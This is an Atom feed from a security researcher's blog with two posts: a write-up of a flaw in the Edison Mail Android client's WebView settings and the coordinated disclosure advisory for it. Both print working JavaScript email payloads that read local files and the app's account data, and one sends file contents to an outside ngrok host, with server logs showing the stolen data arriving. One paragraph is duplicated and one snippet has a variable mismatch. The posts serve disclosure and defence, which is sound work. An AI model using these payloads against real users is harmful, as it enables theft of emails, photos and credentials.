<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <title>sotoventura.com</title>
    <link href="https://sotoventura.com/feed.xml" rel="self" />
    <link href="https://sotoventura.com" />
    <updated>2022-07-21T00:30:09-04:00</updated>
    <author>
        <name>Jesson</name>
    </author>
    <id>https://sotoventura.com</id>

    <entry>
        <title>Abusing WebViews to Steal Files via Email</title>
        <author>
            <name>Jesson</name>
        </author>
        <link href="https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html"/>
        <id>https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html</id>

        <updated>2022-07-21T00:29:51-04:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sotoventura.com/media/posts/7/webview.svg" alt="" />
                    A few months ago, I was testing the email functionality on a company's contact us page, when I set an email to myself containing: &lt;script&gt;&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <img src="https://sotoventura.com/media/posts/7/webview.svg" alt="" />
                <div class="section blog">
<div class="content">
<div class="single-post-text">
<p>A few months ago, I was testing the email functionality on a company's contact us page, when I set an email to myself containing:</p>
<pre class="code_wrapper"><code class="html language-html hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> alert(<span class="hljs-string">"Hi, It's almost lunch time"</span>) </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>It actually was close to lunch time, so I wrapped up testing and waited for the email to arrive in my inbox. Once it arrived, I opened my email client and checked the email, when all of a sudden I was met with this popup:</p>
<figure class="post__image align-center"><img loading="lazy"  src="https://sotoventura.com/images/blogs/webview/alert.png" data-is-external-image="true"  alt="Alert Message triggered via a malicious email" width="208" height="358"></figure>
<p>This was bad. At the time I was using Edison Mail as my primary email client. It offered a number of useful features including package tracking, easy integration with my calendar, and smart replies making it a useful email client. But as soon as I saw that popup, I knew I was going to have to go back to using Gmail. Getting this pop-up was bad. Even before seriously looking into the issue - I had a hunch that the impact of the issue could be serious.</p>
<h4 id="tldr" class="align-center">TL;DR:</h4>
<p>While using Edison Mail - I found that it would execute JavaScript stored inside of emails. This functionality could be abused to read files from user's external storage as well as all their emails. The contents of these files could then be uploaded to a remote server. All by only <strong>OPENING</strong> a malicious email.</p>
<h2 id="findingthedangerouswebviewssettings" class="align-center">Finding the dangerous WebViews Settings</h2>
<p>Android developers frequency use WebViews to incorporate web features into their applications. Normally, when developers use WebViews the default settings are used. Unfortunately, Edison Mail made a number of WebView changes that facilitated attacks against its users. Let's start off by finding the WebView changes made by Edison Mail.</p>
<p>As WebView settings are typically contained within the WebSettings class, we should be able to search the application's decompiled source for any invocations of the WebSettings class. A quick search turned up a number of settings changes made by the application.</p>
<p>Below are a three of the most dangerous settings that were enabled:</p>
<pre class="code_wrapper"><code class="java language-java hljs">setJavaScriptEnabled(<span class="hljs-keyword">true</span>)
setAllowFileAccessFromFileURLs(<span class="hljs-keyword">true</span>)
setAllowUniversalAccessFromFileURLs(<span class="hljs-keyword">true</span>)
</code></pre>
<p>Alone each of these settings is fairly benign, but together and put into the context of an email application each setting change was dangerous. In particular, the <strong>FileAccess</strong> settings were dangerous as they give contents inside the WebView access to local file, but I am getting a head of myself.</p>
<h2 id="abrieflessononwebviewsettings" class="align-center">A brief lesson on WebView Settings</h2>
<p>First, let's review the list of enabled WebView settings to understand a bit about each one.</p>
<p><strong>setJavaScriptEnabled</strong> - does exactly what the name implies and enables JavaScript to be executed inside of the WebView. It seems like this feature should be enabled by default since every developer and every application almost always seem to have this feature enabled. Alone this feature is benign, but when coupled with other setting changes it can be quite dangerous.</p>
<p><strong>SetAllowFileAccessFromFileURls</strong>- allows any JavaScript inside of files loaded using the File URI scheme (<strong>file:///</strong>) to request other resources using the file's URI. Now to fully appreciate how powerful this is, let's take a step back and discuss the File URI scheme.</p>
<p>Content can loaded into WebViews using a number of schemes. The most common is the Universal Resource Locator (URL), but other formats like the Data scheme also exist. In this case, the file scheme is a special scheme that allows a WebView to load local files. Applications typically use this scheme to load locally stored content into the WebView.</p>
<p>This is where the <strong>SetAllowFileAccessFromFileURLs</strong> comes into play. By default, file loaded using the File URI scheme are not able to load additional resources. Enabling the <strong>SetAllowFileAccessFromFileURLS</strong> lets them load other local resources using the File URI scheme.</p>
<p><strong>setAllowUniversalAccessFromFileURLs</strong> - allows JavaScript inside of files loaded using the File URI scheme to request resources using schemes other than the File URI scheme. Of the three setting changes made by Edison mail - this is the most dangerous. It disables a fundamentally important protection and allows local files to request resource using HTTP/S.</p>
<h2 id="testingwebviewswithgooglechrome" class="align-center">Testing WebViews with Google Chrome</h2>
<p>So far we know that the application is taking our emails and executing the JavaScript inside of our email. We also know that the application allows local file resources to request other resources, but we don't know if our JavaScript is being loaded as a file resource or using some other method. To answer that question, let's do some dynamic testing.</p>
<p>Testing WebViews is simple - we can leverage the <strong>setWebContentsDebuggingEnabled</strong> setting. This setting will let us connect to the WebView running on our device using Chrome. From there, it behaves like a normal web page and we can use Chrome's developer console to test the WebView.</p>
<p>But before we get to that stage, we need to enable setWebContentsDebuggingEnabled. To do this decompile the application and added this line of code to any of the applications' OnCreate methods preferably one that is triggered at launch:</p>
<pre class="code_wrapper"><code class="java language-java hljs"><span class="hljs-keyword">const</span>/<span class="hljs-number">4</span> v1, <span class="hljs-number">0x01</span>

invoke-<span class="hljs-keyword">static</span> {v1}, Landroid/webkit/WebView;-&gt;setWebContentsDebuggingEnabled(Z)V
</code></pre>
<p>The best part about this setting is that it is applied globally, so one call is all it takes to debug any newly created WebViews.</p>
<p>From here, we can connect our to Android device to our computer and navigate to <strong>chrome://inspect</strong> using Chrome. Once we open Edison Mail and it launches a WebView we should see it show up.</p>
<p><img loading="lazy" src="https://sotoventura.com/images/blogs/webview/WebView.png" data-is-external-image="true"  alt="Debugging WebViews using Google Chrome"></p>
<p>Now we are ready to start poking around.</p>
<h2 id="timetostealsomefiles" class="align-center">Time to steal some files</h2>
<p>With our testing environment setup, let's see if we can break something. The first thing we need to do is review the context of the WebView. Chrome shows us this, before even opening the WebView.</p>
<p>Under <em>WebView in com.easilydo.mail</em> we see that there are a number of <strong>about:blank</strong> pages. This means that a local file is being used to render the email's content. It is not imminently apparent, but <strong>about:blank</strong> is just an alias for <strong>file:///android_asset</strong>. This means that we should be able to read arbitrary files from the device. Let's validate that.</p>
<p>Pasting the following code into the console:</p>
<pre class="code_wrapper"><code class="js language-js hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">filepath</span>)</span>{
  <span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();
  request.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>() </span>{
    <span class="hljs-keyword">var</span> t = <span class="hljs-keyword">new</span> XMLHttpRequest();
    <span class="hljs-built_in">console</span>.warn(<span class="hljs-keyword">this</span>.responseText);
  };
  xhttp.open(<span class="hljs-string">"GET"</span>, filepath, <span class="hljs-literal">false</span>);
  xhttp.send();
}

getfile(<span class="hljs-string">"file:///sdcard/test.file"</span>)
</code></pre>
<p>Gives us this the contents of /sdcard/test.file</p>
<p><img loading="lazy" src="https://sotoventura.com/blogs/readfile.png" data-is-external-image="true"  alt="Example of reading files from the external SD Card">{.here}</p>
<p>Awesome - We were able to read the contents of a file stored on the user's external storage. The next step is to see if we can upload the contents of the files somewhere. Remember the <strong>setAllowUniversalAccessFromFileURLs</strong> flag? Normally, It would be prevent us from uploading files, but the setting was enabled. To perform a quick test, we can use the following code:</p>
<pre class="code_wrapper"><code class="js language-js hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadfile</span>(<span class="hljs-params">filepath, url</span>)</span>{
  <span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();
  xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>() </span>{
  <span class="hljs-keyword">var</span> upload = <span class="hljs-keyword">new</span> XMLHttpRequest();
  upload.open(<span class="hljs-string">"GET"</span>, url + <span class="hljs-string">"?"</span> + <span class="hljs-keyword">this</span>.responseText , <span class="hljs-literal">false</span>)
  upload.send()
  };
  xhttp.open(<span class="hljs-string">"GET"</span>, filepath, <span class="hljs-literal">false</span>);
  xhttp.send();
}

uploadfile(<span class="hljs-string">"file:///sdcard/test.file"</span>, <span class="hljs-string">"http://3164c2ef.ngrok.io"</span>)
</code></pre>
<p>Gives us this the contents of /sdcard/test.file</p>
<p><img loading="lazy" src="https://sotoventura.com/images/blogs/webview/readfile.png" data-is-external-image="true"  alt="Example of reading files from the external SD Card"></p>
<p>Awesome - We were able to read the contents of a file stored on the user's external storage. The next step is to see if we can upload the contents of the files somewhere. Remember the <strong>setAllowUniversalAccessFromFileURLs</strong> flag? Normally, It would be prevent us from uploading files, but the setting was enabled. To perform a quick test, we can use the following code:</p>
<p>A look over at the server and sure enough the file's contents was uploaded</p>
<pre class="code_wrapper"><code class="hljs plaintext"><span class="hljs-attribute">Serving</span> HTTP <span class="hljs-literal">on</span> <span class="hljs-number">0.0.0.0</span> port <span class="hljs-number">3333</span> (http://0.0.0.0:3333/) ...
<span class="hljs-number">127.0.0.1</span> - - [<span class="hljs-number">12</span>/Aug/<span class="hljs-number">2019</span> <span class="hljs-number">15</span>:<span class="hljs-number">19</span>:<span class="hljs-number">15</span>] <span class="hljs-string">"GET /? HTTP/1.1"</span> <span class="hljs-number">200</span> -
<span class="hljs-number">127.0.0.1</span> - - [<span class="hljs-number">12</span>/Aug/<span class="hljs-number">2019</span> <span class="hljs-number">15</span>:<span class="hljs-number">19</span>:<span class="hljs-number">15</span>] <span class="hljs-string">"GET /?THIS%20FILE%20IS%20ON%20THE%20SDCARD?!?! HTTP/1.1"</span> <span class="hljs-number">200</span> 
</code></pre>
<p>It worked! So now we know that we are able to both read files from the filesystem and upload them to arbitrary sites. With this functionality, we could steal a number of sensitive files from a user - including:</p>
<ul>
<li>- All their emails, which are stored at: <strong>file:///data/data/com.easilydo.mail/databases/ko.db</strong></li>
<li>- All their pictures, which are stored at: <strong>file:///sdcard/DCIM</strong></li>
<li>- All files stored at<strong> file:///sdcard/*</strong></li>
</ul>
<p>What makes this entire attack more dangerous is the fact that it is possible to use the File URI scheme to traverse a directory. Finally, since the file uploads only stop once the user closes the application, it is possible to perform long running tasks like archiving and uploading all of a user's files. All that the attacker needs to do is convince the user to <strong>OPEN</strong> the email.</p>
<h2 id="protectingagainstfutureattacks" class="align-center">Protecting against future attacks</h2>
<p>If not properly secured, WebViews can be used to attack applications. However, these attacks typically rely on one or more of the following conditions existing:</p>
<ul>
<li>Resources being loaded from external storage</li>
<li>Third-party resources being loaded without domain white listing</li>
<li>Allowing JavaScript to be executed</li>
<li>Usage of dangerous JavaScript Interfaces</li>
<li>Modification of WebSettings to permit access to privileged data</li>
</ul>
<p>If any of the above conditions exist, than it may be possible to leverage one or more condition to gain a foothold inside of the WebView. As a precaution, we have see that a number of applications are performing the following actions to protect against WebView attacks:</p>
<ul>
<li>Applications that are caching content in external storage will store the hash of the file preventing cached files from being modified</li>
<li>Domains and resources are being white listed to prevent unknown third parties form interacting with the WebView</li>
<li>Applications will filter out dangerous JavaScript functions</li>
<li>Dangerous JavaScript functions will be overloaded and disabled</li>
<li>JavaScript interfaces are used sparely and assessed to ensure that they can not be abused</li>
</ul>
<p>Of the above solutions, Edison mail used the third approach to protecting their users. The application now filters out any dangerous scripts from the email prior to rendering it in a WebView. As of version 1.7.2 the application is no longer vulnerable to the payloads shared above.</p>
<p>For more details checkout the <a href="https://sotoventura.com/edison-mail-disclosure.html"><em>Edison Mail Disclosure</em></a><em> blog.</em></p>
</div>
</div>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Edison Mail Disclosure</title>
        <author>
            <name>Jesson</name>
        </author>
        <link href="https://sotoventura.com/edison-mail-disclosure.html"/>
        <id>https://sotoventura.com/edison-mail-disclosure.html</id>

        <updated>2022-07-21T00:30:09-04:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sotoventura.com/media/posts/8/disclosure.jpg" alt="" />
                    The Carve Systems team coordinates its disclosure with vendors when at all possible. This advisory is for Edison Mail Client version: Carve Systems consultants found&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <img src="https://sotoventura.com/media/posts/8/disclosure.jpg" alt="" />
                <div class="wrapper">
<div class="section blog">
<div class="content">
<div class="single-post-text">
<p>The Carve Systems team coordinates its disclosure with vendors when at all possible. This advisory is for Edison Mail Client version:</p>
<ul>
<li>Android - 1.6.1</li>
<li>iOS - 1.9.16</li>
</ul>
<p>Carve Systems consultants found that the Edison Mail Client on both iOS and Android would execute arbitrary JavaScript stored inside of HTML emails. Furthermore, consultants also found that it was possible to leverage this functionality to read and upload files off of a user's Android device and onto other - additional details can be found in the <a href="https://sotoventura.com/abusing-webviews-to-steal-files-via-email.html">Abusing WebViews to Steal Files via Email</a> blog.</p>
<h2 id="disclosuretimeline">Disclosure Timeline</h2>
<ul>
<li>3/20/19 - Initial Contact sent via vendor's contact page</li>
<li>3/27/19 - Vendor replies to Carve Systems team asking for details.</li>
<li>3/28/19 - Carve Systems shares initial advisory contents with Vendor.</li>
<li>3/29/19 - Vendor indicates that the issue will be resolved in the next release towards the end of April or early May.</li>
<li>6/3/19 - Carve Systems contacts vendor asking when fix will be implemented. Carve Systems is told that the iOS version has been fixed, but the android version has not.</li>
<li>6/4/19 - Carve Systems works with vendor to delay public posting for 30 days</li>
<li>6/17/19 - Vendor contacts Carve Systems stating that the issue has been resolved on Android.</li>
</ul>
<h2 id="advisorycontents">Advisory Contents</h2>
<p>Details about these findings were shared with Edison mail on March 28, 2019.</p>
<p>The slightly modified version of the initial email is shared below:</p>
<pre><code class="markdown hljs">
<span class="hljs-section">## Versions Tested:</span>
<span class="hljs-bullet">
- </span>Android version 1.6.1 (92)
<span class="hljs-bullet">- </span>iOS 1.9.16 (828)

<span class="hljs-section">## Details</span>

The Edison mail mobile client executes any JavaScript contained within the body of 
an email containing HTML content. This code execution vulnerability can be triggered 
with minimal user interaction. On iOS, the vulnerability requires that a user reply or 
forward the email - on occasions simply opening the email also triggers the payload; 
this is unreliable. However, Android will execute the remote code anytime the email body 
is rendered, as such opening an email, replying to an email, or forwarding an email 
will execute the code.

As an example consider the following HTML email:

<span class="hljs-code">```
EMAIL BODY

&lt;script&gt;
  alert("Edison Mail has detected your phone is out of storage, 
    please visit http://fakesite.com to get more storage");
&lt;/script&gt;

```</span>

This email will create a normal looking email, but once the script tag's code has 
been executed a popup will appear. Although benign, the above could be used to 
craft a convincing phishing campaign. For a more malicious example, see the 
following issue.

<span class="hljs-section">## Replication Steps:</span>
<span class="hljs-bullet">
1. </span>Using a service that allows sending of HTML emails, such as <span class="hljs-code">`https://putsmail.com/tests/new`</span>, send the following example to an iOS or Android device using Edison Mail.

<span class="hljs-code">```
EMAIL BODY
  &lt;script&gt;
    alert("Edison Mail has detected your phone is out of storage, please visit http://fakesite.com to get more storage");
  &lt;/script&gt;

```</span>
<span class="hljs-bullet">
2. </span>On Android simply opening the email should trigger a pop up. On iOS open the 
email and attempt to reply or forward the email to trigger the popup.

<span class="hljs-section"># Remote code execution can be leveraged to remotely read contents off a user's </span>
devices.

<span class="hljs-section">## Versions Tested</span>
<span class="hljs-bullet">
- </span>Android version 1.6.1 (92)

<span class="hljs-section">## Details</span>

The remote code execution vulnerability discussed above is executed within a WebView 
on Android. This WebView uses overly permissive settings, which allow an attacker 
to not only execute code within the WebView, but also read the contents of files 
on the device. As the WebView is running under the Edison mail application, 
it has access to both files stored on the user's external storage as well as 
the application's internal storage.

As an example consider the following:

<span class="hljs-code">```
EMAIL BODY
&lt;script&gt;
  function alertFile(filepath){
    var fileRequest = new XMLHttpRequest();
    fileRequest.onreadystatechange = function(){
      alert(this.responseText);
    }
    fileRequest.open("GET", filepath, false);
    fileRequest.send();
  }
  alertFile("file:///data/data/com.easilydo.mail/shared_prefs/EdoChatAccount.xml");
  alertFile("file:///sdcard/test.txt");
&lt;/script&gt;

```</span>

<span class="hljs-strong">**Note:**</span> In order to have this example completely function, a file on the SD card with 
the name <span class="hljs-code">`test.txt`</span> must first be created.


The above example will only read and display the contents of the file to the user, however 
it is would be possible to modify the above code snippet to not only read the file's content,
but to also upload the file's content to remote server. Additionally, in order for a user to 
retrieve files from a user's device they must know the file path ahead of time. However, multiple 
files with known static paths exist. For example, if the <span class="hljs-code">`data/data/com.easilydo.mail/files/Email.realm`</span> 
file is read and upload, an attacker could get a copy of all cached emails sent from/to the user.


<span class="hljs-section">## Replication Steps:</span>
<span class="hljs-bullet">
1. </span>Using a service that allows sending of HTML emails, such as <span class="hljs-code">`https://putsmail.com/tests/new`</span>, send 
the following example to an iOS or Android device using Edison Mail.

<span class="hljs-code">```
EMAIL BODY
  &lt;script&gt;
    function alertFile(filepath){
      var fileRequest = new XMLHttpRequest();
      fileRequest.onreadystatechange = function(){
        alert(this.responseText);
      }
      fileRequest.open("GET", filepath, false);
      fileRequest.send();
    }
    alertFile("file:///data/data/com.easilydo.mail/shared_prefs/EdoChatAccount.xml");
    alertFile("file:///sdcard/test.txt");
  &lt;/script&gt;

```</span>
<span class="hljs-bullet">
2. </span>On Android simply opening the email should trigger various popups. The first one may be blank.
<span class="hljs-bullet">3. </span>Hitting OK, should show the contents of the <span class="hljs-code">`EdoChatAccount.xml`</span> file.
<span class="hljs-bullet">4. </span>If present, hitting OK should show the contents of the <span class="hljs-code">`test.txt`</span> file.
</code></pre>
</div>
<div class="clear">Â </div>
</div>
</div>
</div>
            ]]>
        </content>
    </entry>
</feed>
